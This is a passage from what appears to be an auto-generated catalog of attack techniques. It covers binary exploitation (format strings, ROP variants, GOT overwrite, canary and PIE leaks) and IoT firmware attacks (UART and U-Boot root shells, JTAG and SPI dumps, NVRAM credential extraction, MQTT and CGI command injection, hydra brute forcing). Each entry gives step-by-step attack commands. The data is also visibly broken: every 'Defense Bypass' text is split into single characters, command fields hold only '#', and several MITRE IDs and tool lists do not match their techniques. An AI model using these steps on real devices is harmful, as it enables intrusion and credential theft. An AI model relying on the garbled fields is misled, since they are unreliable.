- Remediation: Enable stack canaries, ASLR, DEP/NX, PIE, RELRO
- MITRE ID: T1059.007
- Command: #
- Steps (4):
  1. {'step': 1, 'description': 'Trigger double free', 'command': 'free(chunk); free(chunk);', 'note': 'Same chunk freed twice'}
  2. {'step': 2, 'description': 'Corrupt freelist', 'command': 'Overwrite chunk->fd with target_address', 'note': 'Next malloc returns target_address'}
  3. {'step': 3, 'description': 'Allocate corrupted chunks', 'command': 'malloc(size); malloc(size);', 'note': 'Second malloc returns target_address'}
  4. {'step': 4, 'description': 'Write to arbitrary address', 'command': 'Write data to returned chunk', 'note': 'Achieves arbitrary write primitive'}
- Related Tools: 15 — ROPgadget, angr, checksec, curl, dig, docker, file, find, gcc, gdb, gdb-multiarch, gdb-peda, gef, getcap, ghidra

#### format-string-exploit — Format String Exploitation
- Zone: binary-exploitation | Category: binary-exploitation | Difficulty: 3
- OS: linux, windows
- Tags: binary, format-string, memory-disclosure, arbitrary-write
- Purpose: Read/write arbitrary memory via format string vulnerabilities
- When To Use: When printf(user_input) or similar pattern exists in binary
- Prerequisites: Format string vulnerability (printf with user input), Ability to control stack position
- Defense Bypass: F, o, r, m, a, t,  , s, t, r, i, n, g,  , b, u, g, s,  , a, r, e,  , p, r, o, g, r, a, m, m, i, n, g,  , e, r, r, o, r, s, ;,  , m, o, d, e, r, n,  , c, o, m, p, i, l, e, r, s,  , w, a, r, n,  , a, b, o, u, t,  , t, h, e, m, .,  , R, E, L, R, O,  , p, a, r, t, i, a, l, l, y,  , m, i, t, i, g, a, t, e, s,  , G, O, T,  , o, v, e, r, w, r, i, t, e, s, .
- Remediation: Enable stack canaries, ASLR, DEP/NX, PIE, RELRO
- MITRE ID: T1059.007
- Command: #
- Steps (4):
  1. {'step': 1, 'description': 'Identify format string', 'command': './binary "AAAA.%x.%x.%x.%x.%x.%x.%x.%x"', 'note': 'Find which %N$x shows 41414141'}
  2. {'step': 2, 'description': 'Leak memory addresses', 'command': './binary "AAAA.%7$s"', 'note': 'Read string at stack position 7'}
  3. {'step': 3, 'description': 'Arbitrary write with %n', 'command': 'payload = fmtstr_payload(6, {target_addr: value})', 'note': 'pwntools automates format string payload generation'}
  4. {'step': 4, 'description': 'Exploit for code execution', 'command': 'Overwrite GOT entry, return address, or function pointer', 'note': 'Common targets: printf@got, strcmp@got, return address'}
- Related Tools: 15 — ROPgadget, angr, checksec, curl, dig, docker, file, find, gcc, gdb, gdb-multiarch, gdb-peda, gef, getcap, ghidra

#### srop — SROP — Sigreturn Oriented Programming
- Zone: binary-exploitation | Category: binary-exploitation | Difficulty: 4
- OS: linux
- Tags: binary, srop, sigreturn, rop, advanced
- Purpose: Set all registers arbitrarily via sigreturn syscall
- When To Use: When binary has a sigreturn gadget but limited other ROP gadgets
- Prerequisites: Sigreturn gadget (syscall; ret), Control over registers (especially RAX/RSP), Knowledge of syscall numbers
- Defense Bypass: S, R, O, P,  , r, e, q, u, i, r, e, s,  , s, i, g, r, e, t, u, r, n,  , g, a, d, g, e, t, ;,  , m, o, d, e, r, n,  , k, e, r, n, e, l, s,  , h, a, v, e,  , s, i, g, r, e, t, u, r, n,  , r, e, s, t, r, i, c, t, i, o, n, s
- Remediation: Enable stack canaries, ASLR, DEP/NX, PIE, RELRO
- MITRE ID: T1059.007
- Command: #
- Steps (4):
  1. {'step': 1, 'description': 'Find sigreturn gadget', 'command': 'ROPgadget --binary ./binary --only "syscall" | grep ret', 'note': "Look for 'syscall; ret' or 'int 0x80; ret'"}
  2. {'step': 2, 'description': 'Set RAX to 0xf (sys_rt_sigreturn)', 'command': 'Set RAX = 15 (x64) or 0x80/0x77 (x86)', 'note': 'sigreturn syscall number'}
  3. {'step': 3, 'description': 'Build SROP frame on stack', 'command': 'Craft struct rt_sigframe with register values', 'note': 'Set RIP, RSP, RDI, RSI, RDX to desired values'}
  4. {'step': 4, 'description': 'Trigger sigreturn', 'command': 'jump to sigreturn gadget', 'note': "All registers loaded from frame; execute system('/bin/sh') chain"}
- Related Tools: 15 — ROPgadget, angr, checksec, curl, dig, docker, file, find, gcc, gdb, gdb-multiarch, gdb-peda, gef, getcap, ghidra

#### ret2csu — ret2csu — __libc_csu_init Gadgets
- Zone: binary-exploitation | Category: binary-exploitation | Difficulty: 4
- OS: linux
- Tags: binary, rop, ret2csu, x86-64, gadgets
- Purpose: Universal ROP setup for calling functions with arguments on x86-64
- When To Use: When binary lacks individual pop rdi/ret etc. but has __libc_csu_init
- Prerequisites: Control over RIP, __libc_csu_init function present in binary, Knowledge of x86-64 calling convention
- Defense Bypass: r, e, t, 2, c, s, u,  , i, s,  , a,  , R, O, P,  , t, e, c, h, n, i, q, u, e, ;,  , s, a, m, e,  , m, i, t, i, g, a, t, i, o, n, s,  , a, s,  , o, t, h, e, r,  , R, O, P,  , (, A, S, L, R, ,,  , P, I, E, ,,  , R, E, L, R, O, )
- Remediation: Enable stack canaries, ASLR, DEP/NX, PIE, RELRO
- MITRE ID: T1059.007
- Command: #
- Steps (4):
  1. {'step': 1, 'description': 'Find __libc_csu_init gadgets', 'command': 'ROPgadget --binary ./binary --only "pop|ret" | grep -A2 "<__libc_csu_init>"', 'note': 'Two gadgets: one for setting up registers, one for calling'}
  2. {'step': 2, 'description': 'Build ret2csu chain', 'command': 'gadget1 + padding + arg1 + arg2 + arg3 + gadget2 + func_addr', 'note': 'First gadget sets registers; second calls function'}
  3. {'step': 3, 'description': "Call system('/bin/sh') via ret2csu", 'command': "gadget1 + padding + '/bin/sh' + 0 + 0 + gadget2 + system", 'note': "RDI = '/bin/sh', other args = 0"}
  4. {'step': 4, 'description': 'Verify exploitation', 'command': 'Run exploit; check for shell', 'note': 'ret2csu works for any function with up to 3 args'}
- Related Tools: 15 — ROPgadget, angr, checksec, curl, dig, docker, file, find, gcc, gdb, gdb-multiarch, gdb-peda, gef, getcap, ghidra

#### got-overwrite — GOT Overwrite
- Zone: binary-exploitation | Category: binary-exploitation | Difficulty: 3
- OS: linux
- Tags: binary, got, plt, overwrite, format-string
- Purpose: Hijack function calls by overwriting GOT entries
- When To Use: When RELRO is Partial or None and arbitrary write is available
- Prerequisites: Arbitrary write primitive, Partial or No RELRO, Knowledge of target function GOT address
- Defense Bypass: F, u, l, l,  , R, E, L, R, O,  , p, r, e, v, e, n, t, s,  , G, O, T,  , o, v, e, r, w, r, i, t, e, s, ;,  , p, a, r, t, i, a, l,  , R, E, L, R, O,  , i, s,  , v, u, l, n, e, r, a, b, l, e, .,  , S, t, a, c, k,  , c, a, n, a, r, y,  , d, o, e, s, n, ', t,  , h, e, l, p, .
- Remediation: Enable stack canaries, ASLR, DEP/NX, PIE, RELRO
- MITRE ID: T1059.007
- Command: #
- Steps (4):
  1. {'step': 1, 'description': 'Check RELRO status', 'command': 'checksec --file=./binary', 'note': 'Partial RELRO = GOT writable; Full RELRO = GOT read-only after reloc'}
  2. {'step': 2, 'description': 'Find target GOT entry', 'command': 'objdump -R ./binary | grep printf', 'note': 'Find GOT offset for target function'}
  3. {'step': 3, 'description': 'Overwrite GOT entry', 'command': 'fmtstr_payload(offset, {got_addr: new_value})', 'note': 'Use format string or arbitrary write to modify GOT'}
  4. {'step': 4, 'description': 'Trigger hijacked function', 'command': 'Call function (e.g., printf) normally', 'note': 'PLT now jumps to attacker-controlled address'}
- Related Tools: 15 — ROPgadget, angr, checksec, curl, dig, docker, file, find, gcc, gdb, gdb-multiarch, gdb-peda, gef, getcap, ghidra

#### canary-leak — Stack Canary Leak
- Zone: binary-exploitation | Category: binary-exploitation | Difficulty: 3
- OS: linux
- Tags: binary, canary, stack-protector, bypass, leak
- Purpose: Bypass stack canary protection by leaking and reusing the value
- When To Use: When stack canary is enabled but a leak (format string, OOB read) exists
- Prerequisites: Stack canary enabled, Information leak vulnerability (format string, etc.)
- Defense Bypass: S, t, a, c, k,  , c, a, n, a, r, i, e, s,  , d, e, t, e, c, t,  , s, t, a, c, k,  , c, o, r, r, u, p, t, i, o, n, ;,  , l, e, a, k, i, n, g,  , t, h, e,  , c, a, n, a, r, y,  , d, e, f, e, a, t, s,  , t, h, e,  , p, r, o, t, e, c, t, i, o, n
- Remediation: Enable stack canaries, ASLR, DEP/NX, PIE, RELRO
- MITRE ID: T1059.007
- Command: #
- Steps (4):
  1. {'step': 1, 'description': 'Identify canary via format string', 'command': './binary "AAAA.%x.%x.%x.%x.%x.%x.%x"', 'note': 'Look for value ending in 00 (canary typically ends with null byte)'}
  2. {'step': 2, 'description': 'Extract exact canary value', 'command': './binary "AAAA.%7$lx"', 'note': 'Canary is typically at a fixed stack offset'}
  3. {'step': 3, 'description': 'Build overflow with correct canary', 'command': "payload = offset_to_eip * 'A' + canary + padding + rop_chain", 'note': 'Include correct canary before return address'}
  4. {'step': 4, 'description': 'Execute exploit', 'command': 'Send crafted payload', 'note': 'Overflow succeeds because canary matches'}
- Related Tools: 15 — ROPgadget, angr, checksec, curl, dig, docker, file, find, gcc, gdb, gdb-multiarch, gdb-peda, gef, getcap, ghidra

#### pie-bypass — PIE Bypass via Address Leak
- Zone: binary-exploitation | Category: binary-exploitation | Difficulty: 3
- OS: linux
- Tags: binary, pie, aslr, bypass, leak
- Purpose: Calculate PIE base from leaked address to bypass ASLR for the binary
- When To Use: When PIE is enabled and an info leak (format string, etc.) exists
- Prerequisites: PIE enabled, Address leak (format string, OOB read, etc.), Knowledge of binary sections
- Defense Bypass: P, I, E,  , r, a, n, d, o, m, i, z, e, s,  , b, i, n, a, r, y,  , b, a, s, e, ;,  , i, n, f, o,  , l, e, a, k, s,  , b, y, p, a, s, s,  , t, h, i, s,  , p, r, o, t, e, c, t, i, o, n, .,  , F, u, l, l,  , A, S, L, R,  , (, i, n, c, l, u, d, i, n, g,  , l, i, b, c, ),  , r, e, q, u, i, r, e, s,  , a, d, d, i, t, i, o, n, a, l,  , l, e, a, k, s, .
- Remediation: Enable stack canaries, ASLR, DEP/NX, PIE, RELRO
- MITRE ID: T1059.007
- Command: #
- Steps (4):
  1. {'step': 1, 'description': 'Leak binary address', 'command': './binary "AAAA.%x.%x.%x.%x.%x"', 'note': 'Find leaked address pointing to binary section'}
  2. {'step': 2, 'description': 'Identify section and offset', 'command': 'readelf -S ./binary | grep .text', 'note': 'Find .text section offset in binary file'}
  3. {'step': 3, 'description': 'Calculate PIE base', 'command': 'pie_base = leaked_address - section_offset', 'note': 'Subtract known offset from leaked runtime address'}
  4. {'step': 4, 'description': 'Build ROP chain with calculated addresses', 'command': 'pop_rdi = pie_base + 0x1234', 'note': 'All gadget addresses now relative to calculated base'}
- Related Tools: 15 — ROPgadget, angr, checksec, curl, dig, docker, file, find, gcc, gdb, gdb-multiarch, gdb-peda, gef, getcap, ghidra

#### integer-overflow — Integer Overflow to Buffer Overflow
- Zone: binary-exploitation | Category: binary-exploitation | Difficulty: 4
- OS: linux, windows
- Tags: binary, integer-overflow, logic-bug, buffer-overflow
- Purpose: Bypass length validation via integer overflow to trigger buffer overflow
- When To Use: When length/size validation uses signed integers and user input controls the size
- Prerequisites: Length parameter passed as signed integer, User-controlled size value, Negative value bypasses check but is used as unsigned in copy
- Defense Bypass: I, n, t, e, g, e, r,  , o, v, e, r, f, l, o, w,  , i, s,  , a,  , l, o, g, i, c,  , b, u, g, ;,  , m, o, d, e, r, n,  , c, o, m, p, i, l, e, r, s,  , m, a, y,  , a, d, d,  , c, h, e, c, k, s,  , b, u, t,  , n, o, t,  , a, l, w, a, y, s
- Remediation: Enable stack canaries, ASLR, DEP/NX, PIE, RELRO
- MITRE ID: T1190
- Command: #
- Steps (4):
  1. {'step': 1, 'description': 'Identify signed length check', 'command': 'Decompile binary in Ghidra; look for (int)len < MAX_SIZE', 'note': 'Signed comparison allows negative values to pass'}
  2. {'step': 2, 'description': 'Send negative size', 'command': 'Send -1 or large negative value as length', 'note': 'Passes signed check but wraps to huge unsigned value'}
  3. {'step': 3, 'description': 'Trigger oversized copy', 'command': 'memcpy(buf, input, len); // len is now huge unsigned', 'note': 'Buffer overflow triggered via size wraparound'}
  4. {'step': 4, 'description': 'Exploit resulting overflow', 'command': 'Overwrite return address or function pointer', 'note': 'Standard BOF exploitation follows'}
- Related Tools: 15 — ROPgadget, angr, checksec, curl, dig, docker, file, find, gcc, gdb, gdb-multiarch, gdb-peda, gef, getcap, ghidra

#### blind-rop — Blind ROP
- Zone: binary-exploitation | Category: binary-exploitation | Difficulty: 5
- OS: linux
- Tags: binary, blind-rop, remote, no-binary
- Purpose: Exploit remote services without access to the binary file
- When To Use: When binary is not available but remote service is accessible
- Prerequisites: Remote service with buffer overflow, Crash detection, Timing or side-channel for gadget detection
- Defense Bypass: B, l, i, n, d,  , R, O, P,  , i, s,  , s, l, o, w,  , a, n, d,  , u, n, r, e, l, i, a, b, l, e, ;,  , r, e, q, u, i, r, e, s,  , p, a, t, i, e, n, c, e,  , a, n, d,  , s, y, s, t, e, m, a, t, i, c,  , g, a, d, g, e, t,  , p, r, o, b, i, n, g
- Remediation: Enable stack canaries, ASLR, DEP/NX, PIE, RELRO
- MITRE ID: T1059.007
- Command: #
- Steps (4):
  1. {'step': 1, 'description': 'Identify crash point', 'command': 'Send large payload and detect crash/SIGSEGV', 'note': 'Basic fuzzing to find crash'}
  2. {'step': 2, 'description': 'Map ROP gadgets via timing', 'command': 'Send payloads ending with different gadget addresses', 'note': 'Timing differences indicate successful/failed gadget execution'}
  3. {'step': 3, 'description': 'Construct ROP chain blindly', 'command': 'Chain gadgets that manipulate stack and call useful functions', 'note': 'Requires understanding of common gadget patterns'}
  4. {'step': 4, 'description': 'Verify exploitation', 'command': 'Observe behavioral changes (timing, network, etc.)', 'note': 'Blind exploitation requires alternative success indicators'}
- Related Tools: 15 — ROPgadget, angr, checksec, curl, dig, docker, evil-winrm, file, find, gcc, gdb, gdb-multiarch, gdb-peda, gef, getcap

#### uart-access — UART Console Access
- Zone: iot-firmware | Category: iot-firmware | Difficulty: 4
- OS: linux
- Tags: iot, uart, hardware, serial, console
- Purpose: Obtain root shell or debug access via UART serial interface
- When To Use: When physical access to IoT device is available
- Prerequisites: Physical device access, USB-to-TTL adapter, UART pin identification
- Defense Bypass: P, h, y, s, i, c, a, l,  , a, c, c, e, s, s,  , r, e, q, u, i, r, e, d, ;,  , U, A, R, T,  , c, o, n, s, o, l, e,  , o, f, t, e, n,  , p, r, o, v, i, d, e, s,  , u, n, r, e, s, t, r, i, c, t, e, d,  , r, o, o, t,  , a, c, c, e, s, s
- Remediation: Secure boot, encrypted firmware updates, disable debug interfaces
- MITRE ID: T1082
- Command: #
- Steps (6):
  1. {'step': 1, 'description': 'Open device and locate UART header', 'command': 'Physical: identify 4-6 pin header on PCB', 'note': 'Common labels: TX, RX, GND, VCC, sometimes RTS/CTS'}
  2. {'step': 2, 'description': 'Identify pins with multimeter', 'command': 'Continuity test: GND to shield; TX=3.3V when powered', 'note': 'Never connect VCC if device already powered'}
  3. {'step': 3, 'description': 'Connect USB-to-TTL adapter', 'command': 'GND->GND, TX->RX, RX->TX, VCC->3.3V (if needed)', 'note': 'Cross TX/RX lines; adapter TX to device RX'}
  4. {'step': 4, 'description': 'Determine baud rate', 'command': 'Try 115200, 57600, 38400, 19200, 9600', 'note': 'U-Boot typically 115200; look for boot messages'}
  5. {'step': 5, 'description': 'Connect serial terminal', 'command': 'screen /dev/ttyUSB0 115200', 'note': 'Alternative: minicom -b 115200 -D /dev/ttyUSB0'}
  6. {'step': 6, 'description': 'Interact with bootloader/shell', 'command': 'Press Enter/Space during boot to interrupt', 'note': 'U-Boot: run bootcmd; Linux: get root shell'}
- Related Tools: 15 — arduino-cli, binwalk, boofuzz, evil-winrm, firmware-mod-kit, flashrom, jtagulator, minicom, mosquitto-clients, mqtt-explorer, one_gadget, openocd, picocom, qemu, qemu-arm-static

#### jtag-debugging — JTAG Debugging
- Zone: iot-firmware | Category: iot-firmware | Difficulty: 5
- OS: linux
- Tags: iot, jtag, hardware, debugging, firmware-extraction
- Purpose: Extract firmware and debug embedded devices via JTAG
- When To Use: When UART is unavailable or locked, and JTAG pins are accessible
- Prerequisites: JTAG adapter (FTDI, J-Link, etc.), Physical device access, JTAG pin identification
- Defense Bypass: P, h, y, s, i, c, a, l,  , a, c, c, e, s, s,  , r, e, q, u, i, r, e, d, ;,  , J, T, A, G,  , p, r, o, v, i, d, e, s,  , d, i, r, e, c, t,  , h, a, r, d, w, a, r, e,  , a, c, c, e, s, s,  , b, y, p, a, s, s, i, n, g,  , a, l, l,  , s, o, f, t, w, a, r, e,  , s, e, c, u, r, i, t, y
- Remediation: Secure boot, encrypted firmware updates, disable debug interfaces
- MITRE ID: T1082
- Command: #
- Steps (5):
  1. {'step': 1, 'description': 'Identify JTAG header', 'command': 'Physical: locate JTAG pins (TMS, TCK, TDI, TDO, GND, VCC)', 'note': 'Often 10-pin or 20-pin header; check PCB silkscreen'}
  2. {'step': 2, 'description': 'Connect JTAG adapter', 'command': 'Connect adapter: TMS, TCK, TDI, TDO, GND, VCC (if needed)', 'note': 'Use JTAGulator for auto-detection if pins unknown'}
  3. {'step': 3, 'description': 'Connect with OpenOCD', 'command': 'openocd -f interface/ftdi/jtagkey2.cfg -f target/unknown.cfg', 'note': 'Start OpenOCD server; may need correct target config'}
  4. {'step': 4, 'description': 'Halt CPU and dump memory', 'command': 'telnet localhost 4444; halt; dump_image firmware.bin 0x0 0x100000', 'note': 'Dump flash memory to file'}
  5. {'step': 5, 'description': 'Extract firmware', 'command': 'Copy dumped memory to analysis workstation', 'note': 'Process with binwalk for filesystem extraction'}
- Related Tools: 15 — arduino-cli, binwalk, boofuzz, firmware-mod-kit, flashrom, gdb, jtagulator, minicom, mosquitto-clients, mqtt-explorer, openocd, picocom, qemu, qemu-arm-static, qemu-mips-static

#### spi-flash-dump — SPI Flash Extraction
- Zone: iot-firmware | Category: iot-firmware | Difficulty: 4
- OS: linux
- Tags: iot, spi, flash, hardware, chip-off
- Purpose: Extract firmware directly from SPI flash chip
- When To Use: When software extraction methods fail or firmware is encrypted/protected
- Prerequisites: SPI flash chip accessible, Hardware programmer (CH341A, Raspberry Pi, etc.), Chip-out capability (hot-air rework station)
- Defense Bypass: P, h, y, s, i, c, a, l,  , c, h, i, p,  , e, x, t, r, a, c, t, i, o, n,  , b, y, p, a, s, s, e, s,  , a, l, l,  , s, o, f, t, w, a, r, e,  , p, r, o, t, e, c, t, i, o, n, s, ;,  , c, h, i, p, -, o, f, f,  , i, s,  , i, n, v, a, s, i, v, e,  , a, n, d,  , m, a, y,  , d, a, m, a, g, e,  , d, e, v, i, c, e
- Remediation: Secure boot, encrypted firmware updates, disable debug interfaces
- MITRE ID: T1082
- Command: #
- Steps (4):
  1. {'step': 1, 'description': 'Identify SPI flash chip', 'command': 'Visual: find chip markings (e.g., W25Q128, MX25L128)', 'note': 'Common chips: Winbond W25Q series, Macronix MX25L series'}
  2. {'step': 2, 'description': 'Connect hardware programmer', 'command': 'Connect CH341A or Raspberry Pi to chip pins (CS, CLK, MOSI, MISO, VCC, GND)', 'note': 'Ensure correct pinout; some chips have VCC on opposite side'}
  3. {'step': 3, 'description': 'Read flash with flashrom', 'command': 'sudo flashrom -p ch341a_spi -r firmware.bin', 'when': 'Dumping firmware via SPI programmer', 'output': 'Complete firmware image'}
  4. {'step': 4, 'description': 'Analyze extracted firmware', 'command': 'binwalk -e firmware.bin', 'note': 'Extract filesystem and analyze contents'}
- Related Tools: 15 — arduino-cli, binwalk, boofuzz, firmware-mod-kit, flashrom, jtagulator, minicom, mosquitto-clients, mqtt-explorer, openocd, picocom, qemu, qemu-arm-static, qemu-mips-static, routersploit

#### firmware-emulation — Firmware Emulation
- Zone: iot-firmware | Category: iot-firmware | Difficulty: 3
- OS: linux
- Tags: iot, emulation, qemu, dynamic-analysis, firmware
- Purpose: Dynamically analyze firmware in emulated environment
- When To Use: When architecture is known (MIPS, ARM, etc.) and QEMU support exists
- Prerequisites: Extracted firmware filesystem, QEMU installed for target architecture, Firmware kernel/bootloader
- Defense Bypass: E, m, u, l, a, t, i, o, n,  , m, a, y,  , n, o, t,  , m, a, t, c, h,  , h, a, r, d, w, a, r, e,  , e, x, a, c, t, l, y, ;,  , t, i, m, i, n, g,  , a, n, d,  , h, a, r, d, w, a, r, e, -, s, p, e, c, i, f, i, c,  , i, s, s, u, e, s,  , m, a, y,  , d, i, f, f, e, r
- Remediation: Secure boot, encrypted firmware updates, disable debug interfaces
- MITRE ID: T1027
- Command: #
- Steps (4):
  1. {'step': 1, 'description': 'Extract firmware filesystem', 'command': 'binwalk -e firmware.bin', 'note': 'Get squashfs-root or extracted filesystem'}
  2. {'step': 2, 'description': 'Identify architecture', 'command': 'file firmware.bin && readelf -h extracted/binary', 'note': 'Determine MIPS, ARM, etc.'}
  3. {'step': 3, 'description': 'Set up QEMU emulation', 'command': 'qemu-mips-static -L ./squashfs-root/ ./squashfs-root/bin/busybox', 'note': 'Run extracted binaries with correct libc'}
  4. {'step': 4, 'description': 'Emulate full firmware boot', 'command': 'qemu-system-mips -kernel kernel -hda rootfs.ext2', 'note': 'Full system emulation for dynamic analysis'}
- Related Tools: 15 — arduino-cli, binwalk, boofuzz, firmware-mod-kit, flashrom, gdb-multiarch, jtagulator, minicom, mosquitto-clients, mqtt-explorer, openocd, picocom, qemu, qemu-arm-static, qemu-mips-static

#### nvram-analysis — NVRAM Configuration Analysis
- Zone: iot-firmware | Category: iot-firmware | Difficulty: 3
- OS: linux
- Tags: iot, nvram, credentials, configuration
- Purpose: Extract sensitive configuration data from NVRAM
- When To Use: When firmware contains NVRAM partitions or device has accessible NVRAM
- Prerequisites: Firmware with NVRAM section, NVRAM partition identified, Parsing tools
- Defense Bypass: N, V, R, A, M,  , d, a, t, a,  , i, s,  , o, f, t, e, n,  , u, n, e, n, c, r, y, p, t, e, d, ;,  , e, x, t, r, a, c, t, i, o, n,  , r, e, q, u, i, r, e, s,  , p, h, y, s, i, c, a, l,  , a, c, c, e, s, s,  , o, r,  , f, i, r, m, w, a, r, e,  , d, u, m, p
- Remediation: Secure boot, encrypted firmware updates, disable debug interfaces
- MITRE ID: T1552
- Command: #
- Steps (4):
  1. {'step': 1, 'description': 'Identify NVRAM partition', 'command': 'binwalk firmware.bin | grep -i nvram', 'note': 'Look for NVRAM signature or partition table'}
  2. {'step': 2, 'description': 'Extract NVRAM data', 'command': 'dd if=firmware.bin of=nvram.bin bs=1 skip=OFFSET count=SIZE', 'note': 'Extract NVRAM partition to separate file'}
  3. {'step': 3, 'description': 'Parse NVRAM structure', 'command': 'Use firmware-mod-kit or custom parser for device-specific format', 'note': 'NVRAM formats are device-specific; check for known parsers'}
  4. {'step': 4, 'description': 'Extract credentials and configs', 'command': "strings nvram.bin | grep -i 'password\\|ssid\\|key\\|secret'", 'note': 'Look for Wi-Fi passwords, admin credentials, API keys'}
- Related Tools: 15 — arduino-cli, binwalk, boofuzz, firmware-mod-kit, flashrom, impacket, jtagulator, lazagne, mimikatz, minicom, mosquitto-clients, mqtt-explorer, openocd, picocom, qemu

#### mqtt-attack — MQTT Protocol Attack
- Zone: iot-firmware | Category: iot-firmware | Difficulty: 2
- OS: linux
- Tags: iot, mqtt, protocol, broker, message-injection
- Purpose: Exploit MQTT broker misconfigurations for IoT device control
- When To Use: When MQTT broker is exposed (port 1883/8883) on IoT network
- Prerequisites: MQTT broker accessible, No or weak authentication, Mosquitto clients or MQTT Explorer
- Defense Bypass: M, Q, T, T,  , w, i, t, h, o, u, t,  , a, u, t, h, e, n, t, i, c, a, t, i, o, n,  , i, s,  , c, o, m, m, o, n,  , i, n,  , I, o, T, ;,  , T, L, S,  , (, 8, 8, 8, 3, ),  , a, d, d, s,  , e, n, c, r, y, p, t, i, o, n,  , b, u, t,  , n, o, t,  , a, u, t, h
- Remediation: Secure boot, encrypted firmware updates, disable debug interfaces
- MITRE ID: T1071.001
- Command: #
- Steps (4):
  1. {'step': 1, 'description': 'Connect to MQTT broker', 'command': "mosquitto_sub -h TARGET_IP -t '#' -v", 'note': 'Subscribe to all topics without authentication'}
  2. {'step': 2, 'description': 'Enumerate topics and messages', 'command': 'Monitor all topics for sensitive data, commands, telemetry', 'note': 'Look for device control commands, sensor data, credentials'}
  3. {'step': 3, 'description': 'Publish malicious commands', 'command': "mosquitto_pub -h TARGET_IP -t 'device/command' -m 'malicious_payload'", 'note': 'Inject commands to IoT devices if broker allows publish'}
  4. {'step': 4, 'description': 'Brute force credentials', 'command': 'hydra -L users.txt -P passwords.txt mqtt://TARGET_IP', 'note': 'If broker requires authentication'}
- Related Tools: 15 — arduino-cli, binwalk, boofuzz, firmware-mod-kit, flashrom, hydra, jtagulator, linux-exploit-suggester, minicom, mosquitto-clients, mqtt-explorer, openocd, picocom, qemu, qemu-arm-static

#### firmware-cgi-injection — CGI Command Injection in Firmware
- Zone: iot-firmware | Category: iot-firmware | Difficulty: 2
- OS: linux
- Tags: iot, cgi, command-injection, firmware, rce
- Purpose: Achieve RCE on IoT devices via CGI script injection
- When To Use: When firmware web interface has CGI scripts with command injection
- Prerequisites: Firmware web interface accessible, CGI scripts identified, Injectable parameters
- Defense Bypass: F, i, r, m, w, a, r, e,  , w, e, b,  , i, n, t, e, r, f, a, c, e, s,  , o, f, t, e, n,  , l, a, c, k,  , W, A, F, ;,  , C, G, I,  , i, n, j, e, c, t, i, o, n,  , i, s,  , c, o, m, m, o, n,  , i, n,  , e, m, b, e, d, d, e, d,  , d, e, v, i, c, e, s
- Remediation: Secure boot, encrypted firmware updates, disable debug interfaces
- MITRE ID: T1059.004
- Command: #
- Steps (4):
  1. {'step': 1, 'description': 'Identify CGI scripts', 'command': "find squashfs-root/ -name '*.cgi' -o -name 'cgi-bin/*'", 'note': 'Extracted firmware often has cgi-bin directory'}
  2. {'step': 2, 'description': 'Analyze CGI script for injection', 'command': "cat squashfs-root/www/cgi-bin/admin.cgi | grep -E 'system|exec|popen|eval'", 'note': 'Look for system()/exec() calls with user input'}
  3. {'step': 3, 'description': 'Test injection on live device', 'command': 'http://target/cgi-bin/admin.cgi?cmd=id', 'note': 'Append command to injectable parameter'}
  4. {'step': 4, 'description': 'Exploit for RCE', 'command': "curl 'http://target/cgi-bin/admin.cgi?cmd=cat+/etc/passwd'", 'note': 'Read files or get reverse shell'}
- Related Tools: 15 — arduino-cli, binwalk, boofuzz, burp-suite, commix, firmware-mod-kit, flashrom, gpp-decrypt, jtagulator, liffy, minicom, mosquitto-clients, mqtt-explorer, openocd, picocom

#### default-creds-iot — Default Credential Exploitation
- Zone: iot-firmware | Category: iot-firmware | Difficulty: 1
- OS: any
- Tags: iot, default-creds, authentication, firmware
- Purpose: Gain initial access to IoT devices using default/hardcoded credentials
- When To Use: When device login is required and no other access method is available
- Prerequisites: Device login page or service accessible, List of default credentials or firmware analysis
- Defense Bypass: D, e, f, a, u, l, t,  , c, r, e, d, e, n, t, i, a, l, s,  , a, r, e,  , a,  , c, o, n, f, i, g, u, r, a, t, i, o, n,  , w, e, a, k, n, e, s, s, ;,  , c, h, a, n, g, i, n, g,  , d, e, f, a, u, l, t, s,  , p, r, e, v, e, n, t, s,  , t, h, i, s,  , a, t, t, a, c, k
- Remediation: Secure boot, encrypted firmware updates, disable debug interfaces
- MITRE ID: T1078.001
- Command: #
- Steps (4):
  1. {'step': 1, 'description': 'Extract credentials from firmware', 'command': "grep -r 'password\\|passwd\\|admin' squashfs-root/", 'note': 'Search extracted firmware for hardcoded credentials'}
  2. {'step': 2, 'description': 'Try common default credentials', 'command': 'hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://TARGET_IP', 'note': 'Common: admin:admin, root:root, admin:password'}
  3. {'step': 3, 'description': 'Check web interface', 'command': "curl -s http://target/ | grep -i 'password\\|login'", 'note': 'Web interfaces may have hardcoded credentials in source'}
  4. {'step': 4, 'description': 'Use found credentials', 'command': 'ssh admin@TARGET_IP or http://admin:pass@target', 'note': 'Gain shell or admin access to device'}
- Related Tools: 15 — arduino-cli, binwalk, boofuzz, burp-suite, certipy, firmware-mod-kit, flashrom, hydra, impacket, jtagulator, jwt_tool, lazagne, mimikatz, minicom, mosquitto-clients

#### bootloader-bypass — Bootloader Bypass
- Zone: iot-firmware | Category: iot-firmware | Difficulty: 4
- OS: linux
- Tags: iot, bootloader, u-boot, hardware, root-shell
- Purpose: Gain root access or modify boot process via bootloader
- When To Use: When UART/U-Boot console is accessible during boot
- Prerequisites: UART access during boot, Bootloader interrupt capability (Enter/Space)
- Defense Bypass: B, o, o, t, l, o, a, d, e, r,  , b, y, p, a, s, s,  , r, e, q, u, i, r, e, s,  , p, h, y, s, i, c, a, l, /, U, A, R, T,  , a, c, c, e, s, s, ;,  , d, i, s, a, b, l, i, n, g,  , U, -, B, o, o, t,  , c, o, n, s, o, l, e,  , p, r, e, v, e, n, t, s,  , t, h, i, s
- Remediation: Secure boot, encrypted firmware updates, disable debug interfaces
- MITRE ID: T1542.001
- Command: #
- Steps (4):
  1. {'step': 1, 'description': 'Connect UART and power on device', 'command': 'screen /dev/ttyUSB0 115200', 'note': 'Watch boot messages; be ready to interrupt'}
  2. {'step': 2, 'description': 'Interrupt bootloader', 'command': 'Press Enter or Space when prompted', 'note': 'Drops to U-Boot shell'}
  3. {'step': 3, 'description': 'Modify boot arguments', 'command': "setenv bootargs 'console=ttyS0,115200 root=/dev/ram0 init=/bin/sh'", 'note': 'Change root and init to get shell'}
  4. {'step': 4, 'description': 'Boot to root shell', 'command': 'boot', 'note': 'Device boots directly to root shell without authentication'}
- Related Tools: 15 — arduino-cli, binwalk, boofuzz, firmware-mod-kit, flashrom, jtagulator, minicom, mosquitto-clients, mqtt-explorer, openocd, picocom, qemu, qemu-arm-static, qemu-mips-static, routersploit

